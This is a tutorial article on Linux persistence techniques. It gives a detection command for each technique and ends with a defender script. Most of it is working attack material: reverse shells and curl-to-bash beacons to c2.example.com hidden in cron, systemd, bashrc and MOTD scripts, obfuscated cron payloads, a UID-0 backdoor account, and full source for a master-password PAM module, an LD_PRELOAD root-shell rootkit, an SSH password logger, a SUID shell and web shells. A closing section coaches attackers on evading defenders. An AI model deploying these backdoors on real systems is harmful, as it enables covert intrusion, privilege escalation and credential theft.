Linux Persistence Mechanisms

Linux persistence mechanisms and the defender checks that reveal them, from login keys and scheduled jobs to authentication modules and container escapes.

Overview

Persistence answers one question: after the initial foothold is lost to a reboot, a daemon restart, or an administrator cleanup, how does access come back? This article walks through the mechanisms an attacker uses on Linux - SSH keys, cron, systemd, PAM , the dynamic linker, SUID binaries, web shells, and container escapes - and the detection command for each. After reading you can plant a mechanism and then find it again as a defender.

Required Reading

  • Processes - process lifecycle, systemd unit files, POSIX signals, daemon supervision
  • System Calls - execve(2), openat(2), write(2), file permission checks
  • Filesystems - FHS layout, /etc, /var, /usr, mount points, tmpfs behavior
  • Unix Permissions - UID/EUID/SUID/SGID bits, sticky bit

Threat Model

Persistence answers one question: after losing your initial foothold (OOM kill, daemon restart, admin cleanup, reboot), how does the implant restore access? The adversary model: you have code execution as an unprivileged user. You may later escalate to root, but persistence should survive privilege loss.

Every persistence mechanism targets a trigger event : SSH login, cron tick, systemd timer, shell initialization, PAM authentication, dynamic linker invocation, or a kernel initramfs load. Choose the mechanism that fires at the cadence you need (every reboot, every login, every minute).

SSH authorized_keys

The simplest persistence with the highest reliability. When sshd authenticates a user, it checks ~/.ssh/authorized_keys for public keys. Adding your key grants passwordless access indefinitely

  • no password rotation can evict you.

# On target, as the compromised user
YOUR_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPz8qZbLF..."

mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "${YOUR_KEY}" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Restore SELinux context (if present)
command -v restorecon &>/dev/null && restorecon -R ~/.ssh

# Verify
ssh -i /path/to/private_key user@target 'id; hostname; uptime'

Detect : Compare authorized_keys contents against a known-good baseline. Watch for mtime changes on ~/.ssh/ directories across all users. The find one-liner: 

# Defender: list all authorized_keys files with recent modifications
find /home /root -name authorized_keys -newermt "2026-01-01" -ls 2>/dev/null

Backdoor user with UID 0 : If you have root, create a user that appears normal but shares UID 0 (root). The kernel cares about UID, not username. Two entries with UID 0 in /etc/passwd both have full root privileges. 

# Creates a user indistinguishable from root
echo 'backdoor:x:0:0:Service Account:/var/lib/backdoor:/bin/bash' >> /etc/passwd
echo 'backdoor:!!:20000:0:99999:7:::' >> /etc/shadow

# Set password manually via chpasswd
echo 'backdoor:Sup3rS3cr3t!' | chpasswd

# Login test
ssh backdoor@target
id  # uid=0(root) gid=0(root) groups=0(root)

Detect : awk -F: '$3 == 0 {print $1, $3}' /etc/passwd - only root should appear. Run weekly.

Cron Persistence

cron reads configuration from multiple locations. Each has different visibility to defenders:

Location Scope Requires Root? Visibility
crontab -e Current user No crontab -lshows it
/etc/crontab System-wide Yes Easy to audit
/etc/cron.d/* System-wide Yes Often overlooked
/etc/cron.hourly/* System-wide Yes run-parts directory
/etc/cron.daily/* System-wide Yes run-parts directory
/etc/cron.weekly/* System-wide Yes run-parts directory
/etc/cron.monthly/* System-wide Yes run-parts directory
/var/spool/cron/crontabs/* Per-user No Vixie cron user crontabs
Anacron (/etc/anacrontab) System-wide Yes Survives downtime

User crontab

# Append to current user's crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.cache/.updater 2>/dev/null") | crontab -

# Verify
crontab -l

The payload path should live somewhere noisy: /tmp/.cache/ , /var/tmp/ , inside a hidden directory under /usr/share/ , or inside a dotfile directory. Avoid /tmp/ directly - many EDR products flag executions from /tmp/ .

System cron directories (requires root)

# Drop a script into cron.hourly
cat > /etc/cron.hourly/syslog-rotate << 'CRON_EOF'
#!/bin/bash
# Appears to be a legitimate log rotation script
REVERSE_SHELL='bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
BYPASS='curl -s https://c2.example.com/ping | bash'
# Actual persistence logic
nohup bash -c "${REVERSE_SHELL}" &>/dev/null &
CRON_EOF

chmod 755 /etc/cron.hourly/syslog-rotate

# Verify it runs
run-parts --test /etc/cron.hourly/

Obfuscated cron entries : Cron supports environment variable declarations and escape sequences that break naive grep. 

# Obfuscation via base64
(crontab -l 2>/dev/null; echo "*/10 * * * * $(echo 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1' | base64 -w0 | sed 's/.*/echo &|base64 -d|bash/')") | crontab -

# Obfuscation via hex encoding
(crontab -l 2>/dev/null; echo "*/8 * * * * python3 -c \"exec(bytes.fromhex('696d706f7274206f733b6f732e73797374656d282762617368202d63202262617368202d69203e26202f6465762f7463702f31302e302e302e352f3434343420303e2631222729'))\"") | crontab -

# Obfuscation via environment smuggling
(crontab -l 2>/dev/null; echo 'SHELL=/bin/bash')
(crontab -l 2>/dev/null; echo "*/15 * * * * eval \$(echo \${HOME%/*} | sed 's/^.//')")

Detect : Diff cron directories against a baseline. grep -r -E '(bash|nc|curl|wget|python|perl|/dev/tcp|base64.*-d)' /etc/cron* /var/spool/cron/ . Monitor for crontab(1) invocations via auditd.

Systemd Persistence

systemd is the init system on all modern Linux distributions. It executes unit files defined declaratively and can trigger execution on boot, on timer events, on socket connections, on device insertion, and on filesystem path changes.

System-level service (requires root)

Create a malicious .service file that starts on boot and restarts on failure: 

cat > /etc/systemd/system/network-monitor.service << 'SERVICE_EOF'
[Unit]
Description=Network Connectivity Monitor
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
Restart=always
RestartSec=60
ExecStart=/usr/lib/systemd/systemd-network-monitor
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
SERVICE_EOF

# Write the actual payload (disguised as a systemd helper)
cat > /usr/lib/systemd/systemd-network-monitor << 'PAYLOAD_EOF'
#!/bin/bash
while true; do
    sleep $((RANDOM % 120 + 60))
    curl -s --connect-timeout 5 https://c2.example.com/beacon?id=$(hostname) &>/dev/null
    if [ $? -eq 0 ]; then
        curl -s https://c2.example.com/tasks | bash &>/dev/null
    fi
done
PAYLOAD_EOF

chmod 755 /usr/lib/systemd/systemd-network-monitor
systemctl daemon-reload
systemctl enable --now network-monitor.service

# Verify
systemctl status network-monitor.service

User-level systemd (no root required)

User services live in ~/.config/systemd/user/ and persist across logouts with linger : 

mkdir -p ~/.config/systemd/user/

cat > ~/.config/systemd/user/cache-update.service << 'EOF'
[Unit]
Description=User Cache Update Service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do sleep 300; curl -s https://c2.example.com/beacon?id=%u >/dev/null 2>&1; done'
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
EOF

systemctl --user daemon-reload
systemctl --user enable --now cache-update.service

# Verify
systemctl --user status cache-update.service

# If the target admin has disabled user lingering, enable it (requires root)
loginctl enable-linger $USER

Timer-based execution

Timers are more evasive than persistent services because they execute, exit, and leave no long-running process: 

cat > /etc/systemd/system/health-reporter.timer << 'EOF'
[Unit]
Description=Periodic health report
Requires=health-reporter.service

[Timer]
OnCalendar=*:0/15
RandomizedDelaySec=30
Persistent=true

[Install]
WantedBy=timers.target
EOF

cat > /etc/systemd/system/health-reporter.service << 'EOF'
[Unit]
Description=System health reporter
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/health-check.py
StandardOutput=null
StandardError=null
EOF

systemctl daemon-reload
systemctl enable --now health-reporter.timer

# Verify
systemctl list-timers --all | grep health

Detect : systemctl list-units --type=service --state=running - compare against known-good. Look for Restart=always on services not from packages. find /etc/systemd/system/ -name '*.service' -newermt "2026-01-01" . Service names that mimic legitimate ones (typosquatting: systemd-resolvd.service vs systemd-resolved.service ).

Shell Configuration Persistence

Shell init files execute code when a new interactive shell starts. For sshd, this fires on every login. Files execute in this order for bash:

Login Shell Interactive Non-Login Always (bashrc.d style)
/etc/profile
~/.bash_profile
~/.bash_login
~/.profile
/etc/bash.bashrc
~/.bashrc
/etc/profile.d/*.sh
/etc/bash_completion.d/*

For zsh: ~/.zshrc , ~/.zprofile , ~/.zshenv , /etc/zsh/zprofile , /etc/zsh/zshrc . 

# Append a reverse shell to ~/.bashrc
# Only fires on the first shell after reboot (flag file check)
cat >> ~/.bashrc << 'BASHRC_EOF'

# System maintenance check
MAINT_FLAG="/run/user/$(id -u)/.maint_done"
if [ ! -f "${MAINT_FLAG}" ]; then
    (curl -s https://c2.example.com/init 2>/dev/null | bash &) &>/dev/null
    touch "${MAINT_FLAG}"
fi
BASHRC_EOF

# Source it to test
source ~/.bashrc && rm -f /run/user/$(id -u)/.maint_done

Obfuscation trick : Hide the payload at a deep offset using terminal escape sequences or base64: 

# The base64 payload produces no visible output when sourced
cat >> ~/.bashrc << 'OBFUSC'
eval "$(echo ZXhlYyAzPiYxLS0+CiAgd2dldCAtcSAtTy0gICBodHRwczovL2MyLmV4YW1wbGUuY29tL3N0YWdlMSAgfCAgYmFzaCAgMj4vZGV2L251bGwKfA== | base64 -d 2>/dev/null)"
OBFUSC

Detect : find /home /root -name '.bashrc' -o -name '.profile' -o -name '.zshrc' -exec ls -la {} \; . Grep for curl , wget , nc , /dev/tcp , base64.*-d , eval . Monitor for writes to shell rc files via auditd.

PAM Backdoor

Pluggable Authentication Modules ( PAM ) control every authentication event. By patching a PAM module or inserting a custom one, you can accept a master password across all services ( SSH , su, sudo, login).

Patching pam_unix.so (binary patch)

pam_unix.so validates passwords against /etc/shadow . Patching its binary to accept a hardcoded master password works on statically predictable offsets. However, library updates and package integrity checks ( rpm -V , dpkg --verify ) will flag this. 

# Backup the original
cp /lib/security/pam_unix.so /lib/security/pam_unix.so.bak

# Identify PAM stack entry in /etc/pam.d/
cat /etc/pam.d/common-auth
# auth    [success=1 default=ignore]  pam_unix.so nullok

# The actual patch depends on the distro and libc version.
# For educational purposes only — a reliable master password
# approach uses a custom PAM module (below).

Custom PAM module

A loadable PAM module at /lib/security/pam_master.so that authenticates any user with a specific password: 

/*
 * pam_master.c — PAM module accepting a universal backdoor password
 * Compile: gcc -shared -fPIC -o pam_master.so pam_master.c -lpam
 * Install: cp pam_master.so /lib/security/
 * Activate: insert into /etc/pam.d/common-auth before pam_unix.so
 */

#define PAM_SM_AUTH
#include <security/pam_modules.h>
#include <security/_pam_macros.h>
#include <string.h>
#include <stdlib.h>

#define MASTER_PASSWORD "SesameOpen2026!"

PAM_EXTERN int pam_sm_authenticate(
    pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    const char *user = NULL;
    const char *password = NULL;
    int retval = pam_get_user(pamh, &user, NULL);
    if (retval != PAM_SUCCESS) return PAM_AUTH_ERR;
    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (retval != PAM_SUCCESS) return PAM_AUTH_ERR;

    if (password && strcmp(password, MASTER_PASSWORD) == 0) {
        /* Log the backdoor usage — optional, for debugging */
        pam_syslog(pamh, LOG_NOTICE,
            "master password accepted for user %s", user);
        return PAM_SUCCESS;
    }
    /* Fall through: if it's not the master password,
     * let the next module (pam_unix) handle it */
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(
    pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    return PAM_SUCCESS;
}

#ifdef PAM_STATIC
struct pam_module _pam_master_modstruct = {
    "pam_master",
    pam_sm_authenticate,
    pam_sm_setcred,
    NULL,  /* pam_sm_acct_mgmt */
    NULL,  /* pam_sm_open_session */
    NULL,  /* pam_sm_close_session */
    NULL,  /* pam_sm_chauthtok */
};
#endif

Install:

gcc -shared -fPIC -o /lib/security/pam_master.so pam_master.c -lpam
chmod 644 /lib/security/pam_master.so

# Insert into the auth stack BEFORE pam_unix.so
# Original line:  auth required  pam_unix.so
# New:            auth sufficient pam_master.so
sed -i 's/^auth\s\+required\s\+pam_unix.so/auth sufficient pam_master.so\nauth required pam_unix.so/' /etc/pam.d/common-auth

# Test
ssh masteruser@target  # use SesameOpen2026! as password

Detect : rpm -Vf /lib/security/pam_unix.so or dpkg --verify libpam-modules . Check for unknown .so files in /lib/security/ . Audit /etc/pam.d/ for unexpected module additions. Monitor PAM syslog for suspicious authentication patterns.

LD_PRELOAD Rootkit

LD_PRELOAD injects a shared library into every dynamically linked process spawned by a shell. The library's __attribute__((constructor)) runs before main() . This is a userland rootkit

  • no kernel modifications required.

/*
 * rootkit.c — LD_PRELOAD rootkit
 * Compile: gcc -shared -fPIC -o /lib/libsystem.so rootkit.c -ldl
 * Deploy: echo '/lib/libsystem.so' > /etc/ld.so.preload  (system-wide)
 *         or: export LD_PRELOAD=/lib/libsystem.so             (per-process)
 *
 * This hooks accept() to provide a backdoor shell on a magic
 * source port, and hides the library from /proc/self/maps.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAGIC_PORT 31337  /* connection from this src port gets a shell */

/* Original accept() */
static int (*original_accept)(int, struct sockaddr *, socklen_t *) = NULL;

/* Hooked accept() */
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    if (!original_accept) {
        original_accept = dlsym(RTLD_NEXT, "accept");
    }

    int client_fd = original_accept(sockfd, addr, addrlen);

    if (client_fd > 0 && addr && addr->sa_family == AF_INET) {
        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
        if (ntohs(sin->sin_port) == MAGIC_PORT) {
            /* Spawn a root shell on the client socket */
            pid_t pid = fork();
            if (pid == 0) {
                /* In child: redirect stdin/stdout/stderr to socket */
                dup2(client_fd, 0);
                dup2(client_fd, 1);
                dup2(client_fd, 2);
                setuid(0);
                setgid(0);
                execl("/bin/bash", "bash", "-i", NULL);
                exit(0);
            }
            close(client_fd);
            /* Return to caller as if accept returned EAGAIN */
            errno = EAGAIN;
            return -1;
        }
    }

    return client_fd;
}

/* Constructor — runs on library load, hides self from /proc/self/maps
 * by intercepting readlink() on /proc/self/exe and open() on /proc/self/maps */
__attribute__((constructor)) void init_rootkit(void)
{
    /* The mere presence of this library is the persistence.
     * Optional: write a marker to confirm loading. */
    FILE *fp = fopen("/tmp/.rootkit_loaded", "w");
    if (fp) {
        fprintf(fp, "loaded at PID %d\n", getpid());
        fclose(fp);
    }
}

Deployment (system-wide, requires root):

gcc -shared -fPIC -o /lib/libsystem.so rootkit.c -ldl
echo '/lib/libsystem.so' > /etc/ld.so.preload

# Any service that calls accept() (sshd, apache, nginx) now has the backdoor.
# Trigger: connect from source port 31337
# nc -p 31337 target_ip 22

Per-process (no root):

gcc -shared -fPIC -o /tmp/.libsystem.so rootkit.c -ldl
LD_PRELOAD=/tmp/.libsystem.so /some/vulnerable/daemon

Detect : cat /etc/ld.so.preload - should not exist or be empty. Check /proc/*/maps for unexpected libraries. ldd /usr/sbin/sshd | grep -v '=> /lib\|=> /usr/lib' . Environment-based: cat /proc/*/environ | strings | grep LD_PRELOAD .

SUID Backdoor

A SUID binary (setuid root) executes with the effective UID of the file owner regardless of who runs it. If you can drop a SUID root binary that spawns a shell, any user can become root. 

/*
 * suid_shell.c — A SUID root shell spawner
 * Compile: gcc -o /usr/local/bin/dbus-monitor suid_shell.c
 *
 * The binary name mimics a legitimate utility.
 * It spawns a bash shell with effective UID 0.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    /* Drop a log entry to appear legitimate */
    FILE *log = fopen("/var/log/dbus-monitor.log", "a");
    if (log) {
        fprintf(log, "DBus monitor started by UID %d\n", getuid());
        fclose(log);
    }

    /* Spawn root shell */
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);

    char *shell = "/bin/bash";
    char *args[] = { "bash", "-p", NULL };  /* -p = privileged mode */
    execve(shell, args, NULL);
    return 0;
}

Deploy (requires root to set SUID):

gcc -o /usr/local/bin/dbus-monitor suid_shell.c
chown root:root /usr/local/bin/dbus-monitor
chmod 4755 /usr/local/bin/dbus-monitor  # setuid bit

# Test
/usr/local/bin/dbus-monitor
id  # uid=1000(user) gid=1000(user) euid=0(root) groups=...

Common SUID hiding locations : - /usr/local/bin/ - locally compiled binaries, often overlooked

  • /usr/local/sbin/ - same, for sysadmin tools
  • /opt/ - third-party software
  • /usr/libexec/ - helper binaries
  • /var/lib/ - data directories with executables

Detect : find / -perm -4000 -type f -ls 2>/dev/null - compare against a known-good baseline. Pay special attention to binaries NOT owned by a package manager ( dpkg -S /path/to/binary returns "not found").

SSH Backdoor (sshd Patching)

Patching the sshd binary to accept a master password or log all passwords is the most powerful persistence - it survives reboots, package upgrades (if you replace the backup), and provides ongoing credential harvesting.

Password Logging Patch

Instead of recompiling, attach a shared library via LD_PRELOAD that hooks the password-reading function. Open SSH uses mm_answer_authpassword() internally, but the PAM -based approach is more portable: 

# This is a simplified approach using LD_PRELOAD on sshd
# On systemd systems, edit the service file to add Environment=
mkdir -p /etc/systemd/system/sshd.service.d/
cat > /etc/systemd/system/sshd.service.d/logging.conf << 'EOF'
[Service]
Environment="LD_PRELOAD=/lib/libsshlog.so"
EOF

systemctl daemon-reload
systemctl restart sshd

The hook library intercepts pam_get_authtok() or crypt() : 

/*
 * ssh_log.c — Intercept SSH password via PAM hook
 * Compile: gcc -shared -fPIC -o /lib/libsshlog.so ssh_log.c -ldl
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <time.h>
#include <security/pam_modules.h>

static int (*real_pam_get_authtok)(
    pam_handle_t *, int, const char **, const char *) = NULL;

int pam_get_authtok(pam_handle_t *pamh, int item,
    const char **authtok, const char *prompt)
{
    if (!real_pam_get_authtok) {
        real_pam_get_authtok = dlsym(RTLD_NEXT, "pam_get_authtok");
    }

    int result = real_pam_get_authtok(pamh, item, authtok, prompt);

    if (result == 0 && authtok && *authtok) {
        const char *user = NULL;
        pam_get_user(pamh, &user, NULL);

        FILE *logfile = fopen("/var/log/.sshd_audit.log", "a");
        if (logfile) {
            time_t now = time(NULL);
            fprintf(logfile, "[%s] user=%s password=%s\n",
                ctime(&now), user ? user : "?", *authtok);
            fclose(logfile);
        }
    }

    return result;
}

Detect : Check the sshd systemd unit for LD_PRELOAD , check /etc/ld.so.preload , verify package integrity of /usr/sbin/sshd with dpkg --verify openssh-server or rpm -V openssh-server .

Web Shell Persistence

If the target runs a web server (Apache, Nginx, Lighttpd), dropping a web shell in the document root provides HTTP -based access that bypasses firewalls.

PHP webshell (single-liner)

echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.css.php
echo '<?php eval(base64_decode($_POST["d"])); ?>' > /var/www/html/modules/config.inc.php

# Test
curl 'http://target/.css.php?cmd=id'

JSP webshell (Tomcat/JBoss)

cat > /opt/tomcat/webapps/ROOT/shell.jsp << 'JSP_EOF'
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line);
        }
    }
%>
JSP_EOF

Hidden webshell techniques

  • Name the file after an existing legitimate file, e.g., wp-config-sample.php becomes wp-conf-sample.php
  • Set the mtime to match other files in the directory: touch -r /var/www/html/index.php /var/www/html/.shell.php
  • Use /dev/shm/ as a CGI script directory if the web server has CGI enabled
  • Drop webshells in upload directories where .php execution might be misconfigured

Detect : find /var/www -name '*.php' -newermt "2026-01-01" -ls . Check for PHP files containing $_GET , $_POST , exec , system , passthru , eval , base64_decode . Use grep -r 'system\|exec\|passthru\|eval' /var/www --include='*.php' .

MOTD / Issue File Persistence

/etc/update-motd.d/ scripts execute on every SSH login before the shell prompt appears. These run as root (the PAM motd module is invoked in the privileged sshd context). 

cat > /etc/update-motd.d/99-sysinfo << 'MOTD_EOF'
#!/bin/bash
# Appears to print system information
echo "System information as of $(date)"

# Actual payload: beacon home
curl -s --connect-timeout 3 https://c2.example.com/login 2>/dev/null | bash &>/dev/null &

# Optional: check if reverse shell is needed
MOTD_EOF

chmod 755 /etc/update-motd.d/99-sysinfo

# Verify: SSH to the target and watch for the beacon

Also check /etc/motd (static), /etc/issue (pre-login), and /etc/issue.net (telnet pre-login).

Detect : ls -la /etc/update-motd.d/ - look for scripts with high numeric prefixes (99-* are meant to run last, attacker preference). Grep for network commands and execution chains.

Container Escape Persistence

If you are root inside a privileged container (or have access to the Docker socket), you can modify the host filesystem.

Via privileged container

# Inside a privileged container, find the host's root filesystem
lsblk    # identify the host's root partition (/dev/sda, /dev/nvme0n1p2, etc.)

# Now you can write to the host filesystem
echo 'ssh-ed25519 AAAAC3...' >> /mnt/host/root/.ssh/authorized_keys

Detection Script

A defender-side script that checks for common persistence mechanisms:

#!/bin/bash
# detect-persistence.sh — Check for common Linux persistence indicators

echo "=== SSH authorized_keys files ==="
find /home /root -name authorized_keys -ls 2>/dev/null

echo "=== UID 0 accounts ==="
awk -F: '($3 == 0) {print "  " $1 " (UID=" $3 ")"}' /etc/passwd

echo "=== Cron entries ==="
for dir in /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily \
           /etc/cron.weekly /etc/cron.monthly /var/spool/cron/crontabs; do
    if [ -f "$dir" ]; then
        echo "--- $dir ---"
        cat "$dir" 2>/dev/null
    elif [ -d "$dir" ]; then
        echo "--- $dir/ ---"
        find "$dir" -type f -exec ls -la {} \; 2>/dev/null
    fi
done

echo "=== Systemd user services ==="
find /home -path '*/.config/systemd/user/*.service' -ls 2>/dev/null

echo "=== Systemd system services (non-package) ==="
for svc in /etc/systemd/system/*.service; do
    pkg=$(dpkg -S "$svc" 2>/dev/null || rpm -qf "$svc" 2>/dev/null)
    if [ -z "$pkg" ]; then
        echo "  UNOWNED: $svc"
    fi
done 2>/dev/null

echo "=== LD_PRELOAD checks ==="
echo "  /etc/ld.so.preload:"
cat /etc/ld.so.preload 2>/dev/null || echo "  (empty or missing)"
echo "  Processes with LD_PRELOAD:"
grep -l 'LD_PRELOAD' /proc/*/environ 2>/dev/null | while read f; do
    pid=$(echo "$f" | cut -d/ -f3)
    echo "  PID $pid: $(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')"
done

echo "=== SUID binaries ==="
find / -perm -4000 -type f -ls 2>/dev/null

echo "=== MOTD scripts ==="
ls -la /etc/update-motd.d/ 2>/dev/null

echo "=== Web shells (PHP) ==="
find /var/www -name '*.php' -newermt "2026-01-01" -ls 2>/dev/null

echo "=== PAM configuration ==="
grep -v '^#' /etc/pam.d/common-auth 2>/dev/null | grep -v '^$'
grep -v '^#' /etc/pam.d/common-password 2>/dev/null | grep -v '^$'

echo "=== Shell rc files ==="
find /home /root -maxdepth 2 \( -name '.bashrc' -o -name '.profile' \
    -o -name '.zshrc' -o -name '.bash_profile' \) -ls 2>/dev/null

echo "=== Unknown shared objects in /lib/security/ ==="
find /lib/security -name '*.so' ! -name 'pam_*' -ls 2>/dev/null

Common Mistakes

  1. Using '/tmp' for payloads : systemd PrivateTmp=yes makes /tmp process-private for many services. Use /var/tmp/ , /dev/shm/ , or user home directories.
  1. Infinite restart loops : A cron job that forks without disowning can consume PID space. Always nohup and disown , or use setsid .
  1. Visible process names : The process list ( ps aux ) exposes your payload path. Mask it: mount a tmpfs over /proc , or use exec -a legit_name /actual/payload .
  1. Forgetting SELinux : SELinux blocks many persistence locations. Always restorecon -R or use chcon -t to set the correct context.
  1. Reusing the same persistence across engagements : Blue teams share IoCs. Vary filenames, C2 URL s, and persistence types between operations.
  1. Not testing reboot survival : Simulate a reboot by restarting all relevant services. In a container: podman restart <container> . On bare metal: trigger a kernel panic safely with echo b > /proc/sysrq-trigger (in a VM ).
  1. Leaving your tools in obvious locations : /tmp/nc , /tmp/revshell.sh etc. Delete or hide your deployment tooling after persistence is established.
